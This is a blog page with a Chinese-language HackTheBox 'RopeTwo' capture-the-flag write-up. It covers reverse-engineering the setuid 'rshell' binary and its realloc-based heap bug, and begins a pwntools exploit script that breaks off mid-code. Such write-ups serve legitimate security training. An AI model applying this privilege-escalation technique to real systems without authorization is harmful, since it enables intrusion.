<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.0.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"fdlucifer.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":null,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="å‰è¨€æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–useræƒé™çš„pwn rshelléƒ¨åˆ†, Tcacheå †åˆ©ç”¨ã€‚">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox-RopeTwo-[pwn-rshell]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="å‰è¨€æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–useræƒé™çš„pwn rshelléƒ¨åˆ†, Tcacheå †åˆ©ç”¨ã€‚">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2021-02-17T19:14:09.000Z">
<meta property="article:modified_time" content="2021-02-17T23:28:31.070Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>HackTheBox-RopeTwo-[pwn-rshell] | lUc1f3r11's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lUc1f3r11's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">39</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">29</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">132</span></a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/lucifer11.jpg">
      <meta itemprop="name" content="lUc1f3r11">
      <meta itemprop="description" content="all things about infosec & ctf">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox-RopeTwo-[pwn-rshell]
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-02-18 03:14:09 / Modified: 07:28:31" itemprop="dateCreated datePublished" datetime="2021-02-18T03:14:09+08:00">2021-02-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">é€†å‘</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–useræƒé™çš„pwn rshelléƒ¨åˆ†, Tcacheå †åˆ©ç”¨ã€‚</p>
<a id="more"></a>

<h2 id="ä¸‹è½½binaryæ–‡ä»¶åˆ†æ"><a href="#ä¸‹è½½binaryæ–‡ä»¶åˆ†æ" class="headerlink" title="ä¸‹è½½binaryæ–‡ä»¶åˆ†æ"></a>ä¸‹è½½binaryæ–‡ä»¶åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/rshell</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">chromeuser@rope2:~$ /usr/bin/rshell</span><br><span class="line">$ id</span><br><span class="line">uid=1000(r4j) gid=1000(r4j) groups=1000(r4j)</span><br><span class="line">$ whoami</span><br><span class="line">r4j</span><br><span class="line">$ ls</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">rshell: <span class="built_in">pwd</span>: <span class="built_in">command</span> not found</span><br><span class="line">$ ^C</span><br><span class="line">chromeuser@rope2:~$</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½rshellæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/usr/bin$ python3 -m http.server 8001</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...</span><br><span class="line">10.10.14.22 - - [17/Feb/2021 19:33:30] <span class="string">&quot;GET /rshell HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># wget http://10.10.10.196:8001/rshell</span></span><br><span class="line">--2021-02-17 14:30:38--  http://10.10.10.196:8001/rshell</span><br><span class="line">æ­£åœ¨è¿æ¥ 10.10.10.196:8001... å·²è¿æ¥ã€‚</span><br><span class="line">å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK</span><br><span class="line">é•¿åº¦ï¼š14312 (14K) [application/octet-stream]</span><br><span class="line">æ­£åœ¨ä¿å­˜è‡³: â€œrshellâ€</span><br><span class="line"></span><br><span class="line">rshell                             100%[===============================================================&gt;]  13.98K  45.0KB/s  ç”¨æ—¶ 0.3s    </span><br><span class="line"></span><br><span class="line">2021-02-17 14:30:39 (45.0 KB/s) - å·²ä¿å­˜ â€œrshellâ€ [14312/14312])</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># ls -la rshell</span></span><br><span class="line">-rw-r--r-- 1 root root 14312  2æœˆ 24  2020 rshell</span><br></pre></td></tr></table></figure>

<h2 id="ä¸»è¦å¾ªç¯"><a href="#ä¸»è¦å¾ªç¯" class="headerlink" title="ä¸»è¦å¾ªç¯"></a>ä¸»è¦å¾ªç¯</h2><p>ä½¿ç”¨<span class="exturl" data-url="aHR0cHM6Ly9naGlkcmEtc3JlLm9yZy8=">Ghidra<i class="fa fa-external-link-alt"></i></span>æ‰“å¼€çœ‹äº†çœ‹ã€‚åœ¨æœç´¢å­—ç¬¦ä¸²â€œcommand not foundâ€ æ—¶ï¼Œå®šä½åœ¨0x1019beå¤„çš„å‡½æ•°ï¼Œå°†å…¶å‘½åä¸ºprocess_inputã€‚è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„å‡½æ•°æ˜¯0x101b93ï¼Œå°†è°ƒç”¨main_loop</p>
<p>ä½¿ç”¨ghidraé‡å‘½åå‡½æ•°åå’Œå˜é‡åä¹‹åçš„ä¼ªä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼Œä¾¿äºé˜…è¯»:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void main_loop(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ssize_t i;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  byte in_buf [200];</span><br><span class="line">  undefined8 canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  init_stuff();</span><br><span class="line">  memset(in_buf,0,200);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;$ &quot;</span>);</span><br><span class="line">      i = <span class="built_in">read</span>(0,in_buf,199);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((int)i &lt; 2);</span><br><span class="line">    in_buf[(int)i + -1] = 0;</span><br><span class="line">    process_input(in_buf);</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®ƒåˆå§‹åŒ–ä¸€äº›ä¸œè¥¿ï¼Œç„¶åè¿›å…¥ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œæ‰“å°$ï¼Œè¯»å–æœ€å¤š200ä¸ªå­—ç¬¦ï¼Œnullç»“æŸè¾“å…¥ï¼Œå¹¶å°†å…¶ä¼ é€’ç»™process_input, process_inputæ ¹æ®è¾“å…¥ä¸­çš„å‰å‡ ä¸ªå­—ç¬¦é‡‡å–è¡ŒåŠ¨:</p>
<table>
<thead>
<tr>
<th align="left">è¾“å…¥å¼€å§‹</th>
<th align="left">é‡‡å–åŠ¨ä½œ</th>
</tr>
</thead>
<tbody><tr>
<td align="left">â€œls â€œ</td>
<td align="left">è°ƒç”¨ do_ls [0x1015cf]</td>
</tr>
<tr>
<td align="left">â€œadd â€œ</td>
<td align="left">è°ƒç”¨ do_add(user_input[4:]) [0x101345]</td>
</tr>
<tr>
<td align="left">â€œrm â€œ</td>
<td align="left">è°ƒç”¨ do_rm(user_input[3:]) [0x10166d]</td>
</tr>
<tr>
<td align="left">â€œecho â€œ</td>
<td align="left">è¾“å‡ºå­—ç¬¦ä¸²çš„å…¶ä½™éƒ¨åˆ†</td>
</tr>
<tr>
<td align="left">â€œedit â€œ</td>
<td align="left">è°ƒç”¨ do_edit(user_input[5:]) [0x1017d8]</td>
</tr>
<tr>
<td align="left">â€œwhoamiâ€</td>
<td align="left">æ‰“å° â€œr4jâ€</td>
</tr>
<tr>
<td align="left">â€œidâ€</td>
<td align="left">æ‰“å° â€œuid=1000(r4j) gid=1000(r4j) groups=1000(r4j)â€</td>
</tr>
<tr>
<td align="left">å…¶å®ƒ</td>
<td align="left">æ‰“å° â€œrshell: %s: command not foundâ€</td>
</tr>
</tbody></table>
<h2 id="Commands"><a href="#Commands" class="headerlink" title="Commands"></a>Commands</h2><p>è¯¥ç¨‹åºä¸€æ¬¡æœ€å¤šä¿å­˜ä¸¤ä¸ªâ€œæ–‡ä»¶â€ï¼Œå…¶ä¸­file1 onæ˜¯0x104060çš„å…¨å±€æ–‡ä»¶ï¼Œfile2æ˜¯0x104130ã€‚å¯¹äºæ¯ä¸ªæ–‡ä»¶ï¼Œå‰8ä¸ªå­—èŠ‚åŒ…å«ä¸€ä¸ªæŒ‡å‘ç”¨æˆ·æä¾›çš„åŒ…å«æ–‡ä»¶å†…å®¹çš„mallocåˆ›å»ºçš„å †ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚æœ‰ä¸€ç§æ£€æŸ¥åªå…è®¸å¤§å°å°äºæˆ–ç­‰äº0x70å­—èŠ‚ã€‚æœ€åä¸€ä¸ª0xC8(200)å­—èŠ‚ä¿å­˜æ–‡ä»¶çš„åç§°ã€‚addå‡½æ•°ç¡®ä¿ç¬¬äºŒä¸ªæ–‡ä»¶ä¸èƒ½ä¸ç°æœ‰æ–‡ä»¶åŒåï¼Œå¹¶ä¸”ä¸èƒ½æ·»åŠ è¶…è¿‡ä¸¤ä¸ªæ–‡ä»¶ã€‚è¿™å°†æ˜¯åˆ©ç”¨è¯¥äºŒè¿›åˆ¶æ–‡ä»¶çš„æœ€å¤§é™åˆ¶ï¼Œå› ä¸ºæ¯æ¬¡åªä½¿ç”¨ä¸¤ä¸ªæ–‡ä»¶å°±å¾ˆéš¾å°†å †æ“ä½œåˆ°æ‚¨æƒ³è¦çš„ä½ç½®ã€‚</p>
<p>lså‘½ä»¤åœ¨ä¸¤ä¸ªæ§½ä¸Šå¾ªç¯ï¼Œå¦‚æœæŒ‡é’ˆéç©ºï¼Œå®ƒå°†æ‰“å°æ–‡ä»¶çš„åç§°ã€‚å®ƒä¸æ‰“å°ä»»ä½•å†…å®¹ï¼Œè€Œä¸”æ— æ³•åˆæ³•åœ°è·å–æ–‡ä»¶çš„å†…å®¹ï¼Œè¿™ä¸ºå¼€å‘æä¾›äº†å¦ä¸€ä¸ªéœ€è¦å…‹æœçš„ä¸»è¦éšœç¢ã€‚</p>
<p>rmå‘½ä»¤åœ¨ä¸¤ä¸ªæ§½ä¸Šå¾ªç¯ï¼ŒæŸ¥çœ‹åç§»é‡ä¸º8çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸è¾“å…¥åŒ¹é…ï¼Œåˆ™å°†å­—ç¬¦ä¸²æ–‡ä»¶åå…¨éƒ¨è®¾ç½®ä¸ºnullï¼Œé‡Šæ”¾åŒ…å«å†…å®¹çš„å †å†…å­˜ï¼Œå¹¶å°†æŒ‡é’ˆè®¾ç½®ä¸ºnullã€‚</p>
<p>editå‘½ä»¤æ˜¯æ¼æ´å­˜åœ¨çš„åœ°æ–¹ã€‚</p>
<p>ä½¿ç”¨ghidraå°†FUN_001017d8å‡½æ•°ä¸­å„ä¸ªå˜é‡å‘½åæˆå¦‚ä¸‹å½¢å¼ï¼Œä¾¿äºé˜…è¯»:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">void do_edit(char *param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  int strcmp_res;</span><br><span class="line">  long in_FS_OFFSET;</span><br><span class="line">  uint read_size;</span><br><span class="line">  int i;</span><br><span class="line">  void *new_buf;</span><br><span class="line">  long canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(long *)(in_FS_OFFSET + 0x28);</span><br><span class="line">  i = 0;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (1 &lt; i) &#123;</span><br><span class="line">      puts(<span class="string">&quot;rshell: No such file or directory&quot;</span>);</span><br><span class="line">LAB_001019a8:</span><br><span class="line">      <span class="keyword">if</span> (canary != *(long *)(in_FS_OFFSET + 0x28)) &#123;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">        __stack_chk_fail();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    strcmp_res = strcmp(param_1,(char *)((long)i * 0xd0 + 0x104068));</span><br><span class="line">    <span class="keyword">if</span> ((strcmp_res == 0) &amp;&amp; ((&amp;item_array)[(long)i * 0x1a] != 0)) &#123;</span><br><span class="line">      read_size = 0;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(&amp;<span class="string">&quot;%u&quot;</span>,&amp;read_size);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> (read_size &lt; 0x71) &#123;</span><br><span class="line">        new_buf = realloc((void *)(&amp;item_array)[(long)i * 0x1a],(ulong)read_size);</span><br><span class="line">        <span class="keyword">if</span> (new_buf == (void *)0x0) &#123;</span><br><span class="line">          puts(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          *(void **)(&amp;item_array + (long)i * 0x1a) = new_buf;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">          <span class="built_in">read</span>(0,(void *)(&amp;item_array)[(long)i * 0x1a],(ulong)read_size);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        puts(<span class="string">&quot;Memory Error!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      goto LAB_001019a8;</span><br><span class="line">    &#125;</span><br><span class="line">    i = i + 1;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå¾ªç¯é¦–å…ˆæ£€æŸ¥iæ˜¯å¦å¤§äº1ï¼Œè¿™è¡¨ç¤ºå®ƒå·²ç»éå†äº†ä¸¤ä¸ªé…ç½®ï¼Œä½†æ²¡æœ‰æ‰¾åˆ°è¦ç¼–è¾‘çš„åŒ¹é…æ–‡ä»¶ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ‰“å°ä¸€æ¡é”™è¯¯æ¶ˆæ¯å¹¶é€€å‡ºã€‚ç„¶åï¼Œå®ƒæ£€æŸ¥å½“å‰é¡¹ï¼Œçœ‹çœ‹åç§°æ˜¯å¦ä¸è¾“å…¥åŒ¹é…ï¼Œå¦‚æœåŒ¹é…ï¼Œå®ƒä¼šæç¤ºè¾“å…¥ä¸€ä¸ªæ–°çš„å¤§å°(ç¡®ä¿å°äº0x71)ï¼Œå¹¶åœ¨ç°æœ‰ç¼“å†²åŒºä¸Šä½¿ç”¨reallocã€‚ç„¶åè¯»å–å¹¶å­˜å‚¨å†…å®¹ï¼Œå¹¶å®Œæˆã€‚</p>
<h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><ul>
<li>åˆ©ç”¨è„šæœ¬</li>
</ul>
<p>ä¸ºäº†ä¸è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶äº¤äº’ï¼Œä½¿ç”¨ä¸€äº›å·¥å…·ã€‚é¦–å…ˆï¼Œå¯åŠ¨ä¸€ä¸ªPythonåˆ©ç”¨è„šæœ¬ã€‚é¦–å…ˆï¼Œå®ƒå°†åªæœ‰ä¸rshellä¸­çš„å„ç§å‘½ä»¤äº¤äº’çš„æ–¹æ³•(è¿™ä¸ªè„šæœ¬å‡è®¾æˆ‘çš„sshå…¬é’¥åœ¨chromeuserçš„authorized_keysæ–‡ä»¶ä¸­):</p>
<ul>
<li>exp.py</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import pdb</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line">def ls():</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> res.split(b<span class="string">&#x27;\n&#x27;</span>)[:-1]:</span><br><span 